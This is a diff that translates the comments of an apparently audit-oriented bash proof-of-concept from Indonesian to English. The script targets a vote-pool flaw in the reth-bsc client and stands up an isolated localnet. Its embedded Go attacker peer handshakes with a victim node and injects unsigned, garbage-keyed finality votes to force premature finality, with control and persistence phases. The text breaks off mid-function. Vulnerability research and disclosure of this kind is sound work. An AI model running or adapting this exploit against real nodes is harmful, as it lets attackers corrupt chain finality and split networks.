@@ -2,12 +2,12 @@
 # ============================================================================
 # poc.sh — ONE-SHOT PoC: Premature Finality via Unverified P2P Vote Injection
 # Target   : reth-bsc (vote_pool.rs RC-1 + RC-2)
-# Chain    : LOCALNET terisolasi — validator cluster via bnb-chain/node-deploy
-# Topologi : validator (host, node-deploy) + victim reth-bsc (host bin / docker
-#            --network host) + attacker Go (host binary). Semua di 127.0.0.1.
-# Artefak  : poc-attack/audit-out/
+# Chain    : isolated LOCALNET — validator cluster via bnb-chain/node-deploy
+# Topology : validator (host, node-deploy) + victim reth-bsc (host bin / docker
+#            --network host) + attacker Go (host binary). All on 127.0.0.1.
+# Artifacts  : poc-attack/audit-out/
 # Usage    : ./poc.sh | ./poc.sh clean
-# Exit     : 0 = premature finality + divergensi jaringan | 3 = tidak teramati | 1 = setup gagal
+# Exit     : 0 = premature finality + network divergence | 3 = not observed | 1 = setup failed
 # Override : RETH_SRC, RETH_BIN, DEPLOY_DIR, GENESIS_JSON, VALIDATOR_ENODE, QUORUM,
 #            VICTIM_RPC_PORT, ATTACK_PORT, OBSERVE/CONTROL/ATTACK/PERSIST_HEADS,
 #            RETH_FORCE_DOCKER=1, CLUSTER_RESET=1
@@ -26,10 +26,10 @@ VICTIM_DATA="$WORKDIR/victim-data"
 
 mkdir -p "$WORKDIR/attacker" "$OUT"
 
-# PATH lengkap — semua subshell (make / bsc_cluster.sh / docker env) mewarisi.
+# Full PATH — all subshells (make / bsc_cluster.sh / docker env) inherit it.
 export PATH="$HOME/.cargo/bin:$HOME/.foundry/bin:$HOME/.local/bin:/usr/local/go/bin:$PATH"
 
-jnum() { # $1=url $2=tag -> block number int (atau -1)
+jnum() { # $1=url $2=tag -> block number int (or -1)
   curl -s -m 3 -X POST -H 'Content-Type: application/json' \
     --data "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"$2\",false],\"id\":1}" \
     "$1" | python3 -c "
@@ -53,74 +53,74 @@ if [ "${1:-}" = "clean" ]; then
   stop_victim
   if [ -d "$DEPLOY_DIR" ]; then
     ( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh stop ) >/dev/null 2>&1
-    echo "[clean] validator cluster dihentikan (data .local tetap; CLUSTER_RESET=1 ./poc.sh untuk ulang)."
+    echo "[clean] validator cluster stopped (.local data kept; CLUSTER_RESET=1 ./poc.sh to restart)."
   fi
-  echo "[clean] selesai."; exit 0
+  echo "[clean] done."; exit 0
 fi
 
 # ---------------------------------------------------------------- [0/9] prereq + toolchain bootstrap
 echo "[0/9] Prereq & toolchain bootstrap..."
 for bin in git curl python3 jq node npm; do
-  command -v $bin >/dev/null || { echo "FATAL: butuh $bin di host"; exit 1; }
+  command -v $bin >/dev/null || { echo "FATAL: need $bin on host"; exit 1; }
 done
 
-# Go (attacker, create-validator, make geth) — install jika absen
+# Go (attacker, create-validator, make geth) — install if absent
 if ! command -v go >/dev/null; then
-  echo "    go tidak ada — menginstall Go 1.24..."
+  echo "    go not found — installing Go 1.24..."
   GOARCH=$(uname -m); [ "$GOARCH" = "x86_64" ] && GOARCH=amd64 || GOARCH=arm64
   curl -sL "https://go.dev/dl/go1.24.1.linux-${GOARCH}.tar.gz" -o /tmp/go.tgz \
     && sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf /tmp/go.tgz \
-    || { echo "FATAL: instalasi go gagal"; exit 1; }
+    || { echo "FATAL: go installation failed"; exit 1; }
 fi
-go version | tee -a "$OUT/toolchain.log" >/dev/null || { echo "FATAL: go tidak tersedia"; exit 1; }
+go version | tee -a "$OUT/toolchain.log" >/dev/null || { echo "FATAL: go not available"; exit 1; }
 
-# Foundry (reset_genesis: forge install/build) — install jika absen
+# Foundry (reset_genesis: forge install/build) — install if absent
 if ! command -v forge >/dev/null; then
-  echo "    forge tidak ada — menginstall foundry (beberapa menit)..."
+  echo "    forge not found — installing foundry (a few minutes)..."
   curl -L https://foundry.paradigm.xyz 2>/dev/null | bash >>"$OUT/toolchain.log" 2>&1 || true
   command -v foundryup >/dev/null && foundryup >>"$OUT/toolchain.log" 2>&1 || true
 fi
-command -v forge >/dev/null || { echo "FATAL: forge tidak tersedia setelah bootstrap — lihat $OUT/toolchain.log"; exit 1; }
+command -v forge >/dev/null || { echo "FATAL: forge not available after bootstrap — see $OUT/toolchain.log"; exit 1; }
 
-# Poetry (reset_genesis: poetry install/run) — install jika absen
+# Poetry (reset_genesis: poetry install/run) — install if absent
 if ! command -v poetry >/dev/null; then
-  echo "    poetry tidak ada — menginstall via pip3 --user..."
+  echo "    poetry not found — installing via pip3 --user..."
   pip3 install --user poetry >>"$OUT/toolchain.log" 2>&1 || true
 fi
-command -v poetry >/dev/null || echo "    WARN: poetry absen — reset mungkin gagal di genesis generation"
+command -v poetry >/dev/null || echo "    WARN: poetry absent — reset may fail at genesis generation"
 
-# Build-essential untuk 'make geth' (bsc) — best effort
+# Build-essential for 'make geth' (bsc) — best effort
 MISSING_BUILD=""
 for pkg in make cmake gcc; do command -v $pkg >/dev/null || MISSING_BUILD="$MISSING_BUILD $pkg"; done
 if [ -n "$MISSING_BUILD" ]; then
-  echo "    menginstall build deps:$MISSING_BUILD"
+  echo "    installing build deps:$MISSING_BUILD"
   sudo apt-get update -qq >>"$OUT/toolchain.log" 2>&1 \
     && sudo apt-get install -y $MISSING_BUILD >>"$OUT/toolchain.log" 2>&1 \
-    || echo "    WARN: apt install gagal — lihat $OUT/toolchain.log"
+    || echo "    WARN: apt install failed — see $OUT/toolchain.log"
 fi
 
-# Lokasi source reth-bsc
+# reth-bsc source location
 RETH_SRC="${RETH_SRC:-}"
 if [ -z "$RETH_SRC" ]; then
   for c in ../reth-bsc ./reth-bsc "$PWD/../reth-bsc" "$PWD"; do
     [ -f "$c/Cargo.toml" ] && [ -d "$c/src" ] && [ -f "$c/src/consensus/parlia/vote_pool.rs" ] && RETH_SRC="$c" && break
   done
 fi
-[ -n "$RETH_SRC" ] && [ -f "$RETH_SRC/Cargo.toml" ] || { echo "FATAL: source reth-bsc tidak ditemukan. Set RETH_SRC=/path/reth-bsc"; exit 1; }
+[ -n "$RETH_SRC" ] && [ -f "$RETH_SRC/Cargo.toml" ] || { echo "FATAL: reth-bsc source not found. Set RETH_SRC=/path/reth-bsc"; exit 1; }
 RETH_SRC=$(cd "$RETH_SRC" && pwd)
 
 RETH_BIN="${RETH_BIN:-}"
 [ -z "$RETH_BIN" ] && [ -x "$RETH_SRC/target/release/reth-bsc" ] && RETH_BIN="$RETH_SRC/target/release/reth-bsc"
 [ -z "$RETH_BIN" ] && [ -x "$RETH_SRC/target/maxperf/reth-bsc" ] && RETH_BIN="$RETH_SRC/target/maxperf/reth-bsc"
 
-# [0b/9] Binary victim belum ada -> make build host (sekali, 10-40 menit).
+# [0b/9] Victim binary not present -> make build host (once, 10-40 minutes).
 if [ -z "$RETH_BIN" ] && [ "${RETH_FORCE_DOCKER:-0}" != "1" ]; then
-  echo "    Binary victim belum ada — 'make build' host (log: $OUT/victim-make.log)"
+  echo "    Victim binary not present — 'make build' host (log: $OUT/victim-make.log)"
   if ( cd "$RETH_SRC" && make build ) >"$OUT/victim-make.log" 2>&1 && [ -x "$RETH_SRC/target/release/reth-bsc" ]; then
     RETH_BIN="$RETH_SRC/target/release/reth-bsc"
-    echo "    OK — binary victim: $RETH_BIN"
+    echo "    OK — victim binary: $RETH_BIN"
   else
-    echo "    WARN: make build gagal — lanjut via docker build (log: $OUT/victim-make.log)"
+    echo "    WARN: make build failed — continuing via docker build (log: $OUT/victim-make.log)"
   fi
 fi
 echo "    reth-bsc: $RETH_SRC  binary: ${RETH_BIN:-<docker build>}"
@@ -136,9 +136,9 @@ EOF
 
 cat > "$WORKDIR/attacker/main.go" <<'EOF'
 // PoC: Premature Finality via Unverified P2P Vote Injection (reth-bsc)
-// Victim memanggil DIAL ke attacker (admin_addPeer) -> attacker = responder
+// Victim calls DIAL to attacker (admin_addPeer) -> attacker = responder
 // -> forkid-echo self-consistent by construction.
-// Fase: OBSERVE -> CONTROL -> ATTACK -> PERSIST -> FORENSIC.
+// Phase: OBSERVE -> CONTROL -> ATTACK -> PERSIST -> FORENSIC.
 package main
 
 import (
@@ -161,7 +161,7 @@ import (
     "github.com/ethereum/go-ethereum/p2p"
 )
 
-// ===== Wire types — field order = RLP field order (vote.rs; dikunci proto.rs reference vector) =====
+// ===== Wire types — field order = RLP field order (vote.rs; locked by proto.rs reference vector) =====
 type VoteData struct {
     SourceNumber uint64
     SourceHash   common.Hash
@@ -169,16 +169,16 @@ type VoteData struct {
     TargetHash   common.Hash
 }
 type VoteEnvelope struct {
-    VoteAddress [48]byte // garbage — tidak pernah di-parse sebagai BLS point (RC-1)
-    Signature   [96]byte // NOL — tidak pernah diverifikasi (RC-1)
+    VoteAddress [48]byte // garbage — never parsed as BLS point (RC-1)
+    Signature   [96]byte // NOL — never verified (RC-1)
     Data        VoteData
 }
-type votesPacket struct{ Votes []*VoteEnvelope } // RLP [[env...]] — wrapper 2 level
-type capPacket struct {                          // RLP [version, extra] — paritas go-bsc
+type votesPacket struct{ Votes []*VoteEnvelope } // RLP [[env...]] — 2-level wrapper
+type capPacket struct {                          // RLP [version, extra] — go-bsc parity
     ProtocolVersion uint64
     Extra           []byte
 }
-type forkID struct { // paritas RLP forkid.ID (EIP-2124): [Hash 32B, Next uint64]
+type forkID struct { // RLP forkid.ID parity (EIP-2124): [Hash 32B, Next uint64]
     Hash [4]byte
     Next uint64
 }
@@ -273,7 +273,7 @@ func (inj *injector) isArmed() bool {
     return inj.armed
 }
 
-// eth/68 responder — mirror status victim (forkid self-consistent by construction)
+// eth/68 responder — mirror victim status (forkid self-consistent by construction)
 func (inj *injector) runEth(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
     msg, err := rw.ReadMsg()
     if err != nil {
@@ -302,7 +302,7 @@ func (inj *injector) runEth(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
     }
 }
 
-// bsc/2: baca capability victim -> kirim capability -> baca sync-dump -> ARMED
+// bsc/2: read victim capability -> send capability -> read sync-dump -> ARMED
 func (inj *injector) run(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
     cancel := make(chan struct{})
     inj.mu.Lock()
@@ -323,9 +323,9 @@ func (inj *injector) run(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
     if err := p2p.Send(crw, 0x00, &capPacket{ProtocolVersion: 2, Extra: []byte{0x00}}); err != nil {
         return err
     }
-    log.Warn("bsc/2 handshake ESTABLISHED — NOL autentikasi", "peer", peer.ID().TerminalString())
+    log.Warn("bsc/2 handshake ESTABLISHED — ZERO authentication", "peer", peer.ID().TerminalString())
 
-    // register_peer() -> sync_pending_votes_to_peer(): dump pool dikirim ke session baru
+    // register_peer() -> sync_pending_votes_to_peer(): pool dump sent to new session
     if msg, err := crw.ReadMsg(); err == nil {
         if msg.Code == 0x01 {
             var pkt votesPacket
@@ -340,7 +340,7 @@ func (inj *injector) run(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
                 }
                 inj.lastSyncHit = hit
                 inj.mu.Unlock()
-                log.Info("sync-dump diterima dari victim", "votes", len(pkt.Votes), "attacker_hits", hit)
+                log.Info("sync-dump received from victim", "votes", len(pkt.Votes), "attacker_hits", hit)
             }
         } else {
             msg.Discard()
@@ -360,7 +360,7 @@ func (inj *injector) run(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
             inj.mu.Unlock()
             return err
         }
-        msg.Discard() // broadcast vote victim — drain
+        msg.Discard() // victim vote broadcast — drain
     }
 }
 
@@ -385,7 +385,7 @@ func (c *cancelRW) ReadMsg() (p2p.Msg, error) {
 }
 func (c *cancelRW) WriteMsg(m p2p.Msg) error { return c.rw.WriteMsg(m) }
 
-// SATU envelope per packet — handle_votes_broadcast() hanya meng-ingest elemen pertama.
+// ONE envelope per packet — handle_votes_broadcast() only ingests the first element.
 func (inj *injector) send(v *VoteEnvelope) error {
     inj.mu.Lock()
     rw := inj.rw
@@ -434,9 +434,9 @@ func watchHeads(rpc string, count int, inject bool, quorum int, wrongTarget bool
                 _, _ = rpcCall(inj.rpc, "admin_addPeer", []any{inj.enode})
                 time.Sleep(1200 * time.Millisecond)
             }
-            target := common.HexToHash(head.Hash) // dibaca LIVE dari state victim
+            target := common.HexToHash(head.Hash) // read LIVE from victim state
             var book map[[48]byte]bool
-            if wrongTarget { // kontrol negatif: bucket yang tak pernah dibaca
+            if wrongTarget { // negative control: bucket never read
                 book = inj.forgedControl
                 var junk [32]byte
                 for i := range junk {
@@ -455,7 +455,7 @@ func watchHeads(rpc string, count int, inject bool, quorum int, wrongTarget bool
                     Signature:   [96]byte{}, // NOL
                     Data: VoteData{
                         SourceNumber: uint64(n - 1), // steady state: justified == head-1
-                        SourceHash:   common.Hash{}, // filter TIDAK memeriksa source_hash (RC-2)
+                        SourceHash:   common.Hash{}, // filter does NOT check source_hash (RC-2)
                         TargetNumber: uint64(n),
                         TargetHash:   target,
                     },
@@ -466,9 +466,9 @@ func watchHeads(rpc string, count int, inject bool, quorum int, wrongTarget bool
             }
         }
 
-        // Window: sampai head baru ATAU finality melompat ATAU timeout.
-        // Premature = finalized mencapai n-1 SELAGU head masih n
-        // (organik BEP-126: finalized = head-2; n-1 baru organik setelah blok n+1 mendarat).
+        // Window: until new head OR finality jumps OR timeout.
+        // Premature = finalized reaches n-1 WHILE head is still n
+        // (organic BEP-126: finalized = head-2; n-1 only organic after block n+1 lands).
         after := before
         forgedThis, lateThis := false, false
         deadline := time.Now().Add(8 * time.Second)
@@ -481,9 +481,9 @@ func watchHeads(rpc string, count int, inject bool, quorum int, wrongTarget bool
             }
             if inject && f == n-1 && before < n-1 {
                 if cur != nil && cur.Hash == head.Hash {
-                    forgedThis = true // PREMATURE — sebelum blok berikutnya
+                    forgedThis = true // PREMATURE — before next block
                 } else {
-                    lateThis = true // tercapai tapi setelah head bergerak = organik
+                    lateThis = true // achieved but after head moved = organic
                 }
                 after = f
                 break
@@ -549,11 +549,11 @@ func main() {
     defer srv.Stop()
 
     if !ensureArmed(rpc, enode, inj, 120*time.Second) {
-        fmt.Println("FAILED: bsc/2 session tidak terbentuk — cek VICTIM_RPC / ADVERTISE_IP / port"); os.Exit(1)
+        fmt.Println("FAILED: bsc/2 session not formed — check VICTIM_RPC / ADVERTISE_IP / port"); os.Exit(1)
     }
     fmt.Println("ARMED:", quorum)
 
-    log.Warn("=== FASE 1: OBSERVE (normal flow — LOGIC_GATE_4) ===")
+    log.Warn("=== PHASE 1: OBSERVE (normal flow — LOGIC_GATE_4) ===")
     obs, _, _ := watchHeads(rpc, observeHeads, false, 0, false, inj, "observe")
     moved := false
     for i := 1; i < len(obs); i++ {
@@ -562,20 +562,20 @@ func main() {
         }
     }
     if moved {
-        log.Warn("CHECKPOINT-1 OK — finality organik bergerak; window steady-state TERBUKA")
+        log.Warn("CHECKPOINT-1 OK — organic finality moved; steady-state window OPEN")
     } else {
-        log.Warn("CHECKPOINT-1 GAGAL — finality organik tidak bergerak (validator tidak vote?). Keterbatasan setup, BUKAN refute temuan (bukti engine: unit test in-tree + source).")
+        log.Warn("CHECKPOINT-1 FAILED — organic finality did not move (validators not voting?). Setup limitation, NOT a refutation of findings (engine proof: in-tree unit test + source).")
     }
 
-    log.Warn("=== FASE 2: CONTROL (target_hash acak — harus no-op) ===")
+    log.Warn("=== PHASE 2: CONTROL (random target_hash — should be no-op) ===")
     _, ctlForged, _ := watchHeads(rpc, controlHeads, true, quorum, true, inj, "control")
     if ctlForged == 0 {
-        log.Warn("NEGATIVE CONTROL OK — vote target salah tidak mengubah finality")
+        log.Warn("NEGATIVE CONTROL OK — wrong target vote did not change finality")
     } else {
-        log.Error("ANOMALI CONTROL — finality berubah tanpa target_hash valid")
+        log.Error("CONTROL ANOMALY — finality changed without valid target_hash")
     }
 
-    log.Warn("=== FASE 3: ATTACK (quorum envelope garbage per head, 0 signature valid) ===")
+    log.Warn("=== PHASE 3: ATTACK (quorum garbage envelope per head, 0 valid signatures) ===")
     ensureArmed(rpc, enode, inj, 10*time.Second)
     _, atkForged, atkLate := watchHeads(rpc, attackHeads, true, quorum, false, inj, "attack")
     if atkForged > 0 {
@@ -583,11 +583,11 @@ func main() {
             "windows_forged", atkForged, "of", attackHeads,
             "votes_per_head", quorum, "valid_bls_signatures", 0)
     } else {
-        log.Warn("TIDAK ada forge prematur teramati", "late_only", atkLate,
-            "note", "window tertutup / CHECKPOINT-1 gagal")
+        log.Warn("NO premature forge observed", "late_only", atkLate,
+            "note", "window closed / CHECKPOINT-1 failed")
     }
 
-    log.Warn("=== FASE 4: PERSIST (injeksi DIHENTIKAN — poison dibaca ulang import-path?) ===")
+    log.Warn("=== PHASE 4: PERSIST (injection STOPPED — poison re-read from import-path?) ===")
     per, _, _ := watchHeads(rpc, persistHeads, false, 0, false, inj, "persist")
     vals := []int64{}
     for _, o := range per {
@@ -600,9 +600,9 @@ func main() {
         }
     }
     log.Warn("PERSIST RESULT", "finalized_sequence", vals, "flapping", flap,
-        "note", "flapping = finality view inkonsisten antar-FCU (poison vs snapshot)")
+        "note", "flapping = finality view inconsistent across FCU (poison vs snapshot)")
 
-    log.Warn("=== FASE 5: FORENSIC (drop session -> re-add -> baca sync-dump victim) ===")
+    log.Warn("=== PHASE 5: FORENSIC (drop session -> re-add -> read victim sync-dump) ===")
     inj.mu.Lock()
     if inj.cancel != nil {
         close(inj.cancel)
@@ -621,14 +621,14 @@ func main() {
         seen, hit, armed := inj.lastSyncSeen, inj.lastSyncHit, inj.armed
         inj.mu.Unlock()
         if armed && seen > 0 {
-            log.Error(">>> VICTIM RETRANSMISI ENVELOPE TAK-TERVERIFIKASI (BUKTI WIRE) <<<",
-                "votes_disinkronkan", seen, "attacker_envelope_hits", hit,
-                "note", "sync_pending_votes_to_peer menyiarkan ulang isi pool (termasuk vote sampah) ke peer baru")
+            log.Error(">>> VICTIM RETRANSMITS UNVERIFIED ENVELOPE (WIRE EVIDENCE) <<<",
+                "desynced_votes", seen, "attacker_envelope_hits", hit,
+                "note", "sync_pending_votes_to_peer rebroadcasts pool contents (including garbage votes) to new peer")
             found = true
         }
     }
     if !found {
-        log.Warn("forensic: sync-dump tidak diterima (pool kosong / reconnect gagal)")
+        log.Warn("forensic: sync-dump not received (empty pool / reconnect failed)")
     }
 
     if atkForged > 0 {
@@ -639,17 +639,17 @@ func main() {
 EOF
 echo "[1/9] Build attacker (go build, host)..."
 ( cd "$WORKDIR/attacker" && go mod tidy && go build -o attacker . ) >"$OUT/attacker-build.log" 2>&1 \
-  || { echo "FATAL: build attacker gagal — lihat $OUT/attacker-build.log"; exit 1; }
+  || { echo "FATAL: attacker build failed — see $OUT/attacker-build.log"; exit 1; }
 
 # ---------------------------------------------------------------- [2/9] node-deploy + auto-fix upstream
 if [ ! -d "$DEPLOY_DIR" ]; then
   git clone --depth 1 https://github.com/bnb-chain/node-deploy.git "$DEPLOY_DIR" \
-    || { echo "FATAL: clone node-deploy gagal"; exit 1; }
+    || { echo "FATAL: clone node-deploy failed"; exit 1; }
 fi
 
-# --- Genesis surgery: samakan konstruktor header genesis geth <-> reth ---
-# reth menyertakan field post-merge di header genesis; geth meng-omit.
-# Suntik nilai field + aktifkan fork di genesis ts -> header identik -> hash identik.
+# --- Genesis surgery: match geth <-> reth genesis header constructor ---
+# reth includes post-merge fields in the genesis header; geth omits them.
+# Inject field values + activate forks in that genesis -> identical headers -> identical hash.
 ensure_genesis_surgery() {
   [ -f "$DEPLOY_DIR/bsc_cluster.sh" ] || return 0
   cat > "$DEPLOY_DIR/genesis_surgery.py" <<'SURGEOF'
@@ -662,9 +662,9 @@ try:
     ts = int(t, 0) if isinstance(t, str) else int(t)
 except Exception:
     ts = 0
-# v6: ft harus future relatif thd SELURUH run (wall clock), bukan ts template.
-# Empirik 08:39 & 16:48: ft lampau -> time-fork aktif sejak blok awal ->
-# fork ID geth vs reth divergen -> victim 0 peers tanpa WARN.
+# v6: ft must be future relative to the ENTIRE run (wall clock), not the template ts.
+# Empirical 08:39 & 16:48: past ft -> time-fork active since early blocks ->
+# geth vs reth fork ID divergent -> victim 0 peers without WARN.
 ft = int(time.time()) + 7200
 for k in list(c.keys()):
     if k.endswith("Time"):
@@ -688,24 +688,24 @@ wrapper = 'function patch_genesis_for_reth() {\n    python3 "${workspace}/genesi
 s = s.replace("sleepAfterStart=10", "sleepAfterStart=10\n" + wrapper, 1)
 s = s.replace("    prepare_config\n", "    prepare_config\n    patch_genesis_for_reth\n", 1)
 p.write_text(s)
-print("[surgery] wrapper ter-inject ke bsc_cluster.sh (after prepare_config, before initNetwork)")
+print("[surgery] wrapper injected into bsc_cluster.sh (after prepare_config, before initNetwork)")
 INJEOF
   fi
 }
 
-# Auto-fix node-deploy (idempotent — clone baru membawa balik bug upstream):
+# Auto-fix node-deploy (idempotent — new clone brings back upstream bugs):
 fix_node_deploy() {
   [ -f "$DEPLOY_DIR/bsc_cluster.sh" ] || return 0
-  # (1) first-run: 'xargs kill' tanpa PID -> usage error -> set -e mati
+  # (1) first-run: 'xargs kill' without PID -> usage error -> set -e dies
   sed -i 's/xargs kill/xargs -r kill/' "$DEPLOY_DIR/bsc_cluster.sh"
   # v9: fork-time override RUNTIME (start_node --override.*) -> future.
-  # Bukti diag: flag = init+30s; blok 8/9/10 sub-detik = maxwell/fermi aktif
-  # (ms-timestamp + interval 1.5s) -> stall blok-9 & divergensi fork-ID.
+  # Diag proof: flag = init+30s; blocks 8/9/10 sub-second = maxwell/fermi active
+  # (ms-timestamp + interval 1.5s) -> block-9 stall & fork-ID divergence.
   grep -q 'PASSED_FORK_DELAY} + 7200' "$DEPLOY_DIR/bsc_cluster.sh" || \
     sed -i 's|passedHardforkTime=$(expr $(date +%s) + ${PASSED_FORK_DELAY})|passedHardforkTime=$(expr $(date +%s) + ${PASSED_FORK_DELAY} + 7200)|' "$DEPLOY_DIR/bsc_cluster.sh"
-  # (2) forge versi baru gagal checkout forge-std v1.7.3 (submodule ds-test) -> git clone manual
+  # (2) new forge version fails to checkout forge-std v1.7.3 (submodule ds-test) -> manual git clone
   sed -i 's|forge install --no-git foundry-rs/forge-std@v1.7.3|git clone --depth 1 --branch v1.7.3 https://github.com/foundry-rs/forge-std lib/forge-std|' "$DEPLOY_DIR/bsc_cluster.sh"
-  # (3) bin/geth tidak dibundel di repo -> build dari source saat reset
+  # (3) bin/geth is not bundled in the repo -> build from source during reset
   if [ ! -x "$DEPLOY_DIR/bin/geth" ]; then
     sed -i 's/useLatestBscClient=false/useLatestBscClient=true/' "$DEPLOY_DIR/.env" 2>/dev/null || true
   fi
@@ -714,10 +714,10 @@ fix_node_deploy
 ensure_genesis_surgery
 
 echo "[2/9] node-deploy: install deps + build create-validator..."
-( pip3 install -r "$DEPLOY_DIR/requirements.txt" ) >"$OUT/deploy-prereq.log" 2>&1 || echo "    WARN: pip3 install gagal — lihat $OUT/deploy-prereq.log"
-( cd "$DEPLOY_DIR/create-validator" && go build ) >>"$OUT/deploy-prereq.log" 2>&1 || echo "    WARN: build create-validator gagal (non-fatal)"
+( pip3 install -r "$DEPLOY_DIR/requirements.txt" ) >"$OUT/deploy-prereq.log" 2>&1 || echo "    WARN: pip3 install failed — see $OUT/deploy-prereq.log"
+( cd "$DEPLOY_DIR/create-validator" && go build ) >>"$OUT/deploy-prereq.log" 2>&1 || echo "    WARN: create-validator build failed (non-fatal)"
 
-# helper RPC cluster (dipakai [2/9] & [2c/9])
+# helper RPC cluster (used by [2/9] & [2c/9])
 m_rpc_up() { curl -s -m 2 -X POST -H 'Content-Type: application/json' \
   --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
   http://127.0.0.1:8545 2>/dev/null | grep -q '"result"'; }
@@ -725,42 +725,42 @@ m_blk0() { rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["
   http://127.0.0.1:8545 | jq -r '.result.hash // empty'; }
 
 if [ ! -f "$DEPLOY_DIR/genesis/genesis.json" ]; then
-  echo "    genesis template belum ada — reset awal (15-40 menit pertama kali)..."
+  echo "    genesis template not present — initial reset (15-40 minutes first time)..."
   export POC_SURGERY_MODE="-plato"
   ( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh reset ) >"$OUT/deploy-reset.log" 2>&1 \
-    || { echo "FATAL: bsc_cluster.sh reset gagal — tail log:"; tail -30 "$OUT/deploy-reset.log"; exit 1; }
+    || { echo "FATAL: bsc_cluster.sh reset failed — tail log:"; tail -30 "$OUT/deploy-reset.log"; exit 1; }
   for i in $(seq 1 90); do m_rpc_up && break; sleep 2; done
   m_rpc_up && printf '%s %s\n' "-plato" "$(m_blk0)" > "$DEPLOY_DIR/.cluster-ok-v9"
 else
-  echo "    genesis template ada — kalibrasi hash dulu ([2b/9]); reset hanya bila perlu ([2c/9])"
+  echo "    genesis template present — calibrate hash first ([2b/9]); reset only if needed ([2c/9])"
 fi
 
 # ---------------------------------------------------------------- [2b/9] GENESIS CALIBRATION v5
-# v4: 'reth=?' = probe RUSAK (discv5 AddrInUse di UDP 39998 FIXED), bukan
-# divergensi. v5: port p2p/disc DINAMIS ACAK + flag identik victim asli +
-# cleanup sisa container + dump 'ss' saat gagal.
-# INSIGHT: aktivasi plato reth-bsc BERBASIS BLOCK (is_plato_active_at_block
-# di get_finalized_number_and_hash & pre_execution.rs); template sudah punya
-# platoBlock:7 → plato TIDAK memengaruhi hash genesis. Divergensi all-zero
-# (0x61ca) berasal dari shanghai/cancun/prague=0. Kandidat utama '-plato'
-# = replika persis config run 07:08 yang dulu MATCH.
+# v4: 'reth=?' = BROKEN probe (discv5 AddrInUse on UDP 39998 FIXED), not
+# divergence. v5: RANDOM DYNAMIC p2p/disc ports + flags identical to real victim +
+# cleanup leftover containers + dump 'ss' on failure.
+# INSIGHT: reth-bsc plato activation is BLOCK-BASED (is_plato_active_at_block
+# in get_finalized_number_and_hash & pre_execution.rs); template already has
+# platoBlock:7 → plato does NOT affect genesis hash. All-zero divergence
+# (0x61ca) comes from shanghai/cancun/prague=0. Main candidate '-plato'
+# = exact replica of 07:08 run config which previously MATCHED.
 echo "[2b/9] Genesis calibration v5..."
-docker rm -f reth-probe reth-victim >/dev/null 2>&1 || true  # sisa run lama
+docker rm -f reth-probe reth-victim >/dev/null 2>&1 || true  # leftovers from old run
 UG_GETH="$DEPLOY_DIR/bin/geth"
 [ -x "$UG_GETH" ] || UG_GETH="$(find "$DEPLOY_DIR" -maxdepth 4 -type f -name geth -perm -u+x 2>/dev/null | head -n1)"
 { [ -n "${UG_GETH:-}" ] && [ -x "$UG_GETH" ]; } || UG_GETH="$(command -v geth || true)"
-[ -n "${UG_GETH:-}" ] && [ -x "$UG_GETH" ] || { echo "FATAL: binary geth tidak ditemukan"; exit 1; }
+[ -n "${UG_GETH:-}" ] && [ -x "$UG_GETH" ] || { echo "FATAL: geth binary not found"; exit 1; }
 echo "    geth: $UG_GETH"
 
 if [ -z "$RETH_BIN" ] && ! docker image inspect "$VICTIM_IMAGE" >/dev/null 2>&1; then
-  echo "    build image reth (sekali; log: $OUT/victim-build.log)..."
+  echo "    build reth image (once; log: $OUT/victim-build.log)..."
   if ! grep -q "^poc-attack" "$RETH_SRC/.dockerignore" 2>/dev/null; then
     printf '\n# --- poc.sh ---\npoc-attack\ntarget\n.git\ndist\ndiag\n' >> "$RETH_SRC/.dockerignore"
   fi
   docker build -t "$VICTIM_IMAGE" --build-arg BUILD_PROFILE=release \
     --build-arg FEATURES="${RETH_FEATURES:-jemalloc,asm-keccak}" \
     "$RETH_SRC" >"$OUT/victim-build.log" 2>&1 \
-    || { echo "FATAL: build docker reth gagal — lihat $OUT/victim-build.log"; exit 1; }
+    || { echo "FATAL: docker reth build failed — see $OUT/victim-build.log"; exit 1; }
 fi
 
 m_rpc_up() { curl -s -m 2 -X POST -H 'Content-Type: application/json' \
@@ -769,14 +769,14 @@ m_rpc_up() { curl -s -m 2 -X POST -H 'Content-Type: application/json' \
 m_blk0() { rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' \
   http://127.0.0.1:8545 | jq -r '.result.hash // empty'; }
 
-geth_probe() { # $1=file genesis -> echo hash
+geth_probe() { # $1=genesis file -> echo hash
   local gd; gd="$WORKDIR/probe-geth-data"; rm -rf "$gd"; mkdir -p "$gd"
   "$UG_GETH" init --datadir "$gd" "$1" 2>&1 \
     | grep -oP 'Successfully wrote genesis state\s+hash=\K0x[0-9a-f]+' | head -n1
   rm -rf "$gd"
 }
 
-reth_probe() { # $1=file genesis -> echo hash; kosong = gagal (lihat probe-reth-crash.log)
+reth_probe() { # $1=genesis file -> echo hash; empty = failed (see probe-reth-crash.log)
   local gf="$1" pp p2p disc h i running
   docker rm -f reth-probe >/dev/null 2>&1
   pp=8599; while port_busy "$pp"; do pp=$((pp+1)); done
@@ -813,10 +813,10 @@ reth_probe() { # $1=file genesis -> echo hash; kosong = gagal (lihat probe-reth-
     sleep 0.5
   done
   if [ -z "$h" ]; then
-    { echo "=== probe reth GAGAL: $gf (rpc=$pp p2p=$p2p disc=$disc) ==="
+    { echo "=== reth probe FAILED: $gf (rpc=$pp p2p=$p2p disc=$disc) ==="
       echo "--- docker ps -a:"; docker ps -a --format '{{.Names}}  {{.Status}}' 2>&1 | head -n 15
       echo "--- ss -lunp (UDP):"; ss -lunp 2>/dev/null | head -n 30
-      echo "--- ss -ltnp (TCP port probe):"; ss -ltnp 2>/dev/null | grep -E ":($p2p|$pp)\b" || echo "(tidak ada)"
+      echo "--- ss -ltnp (TCP port probe):"; ss -ltnp 2>/dev/null | grep -E ":($p2p|$pp)\b" || echo "(none)"
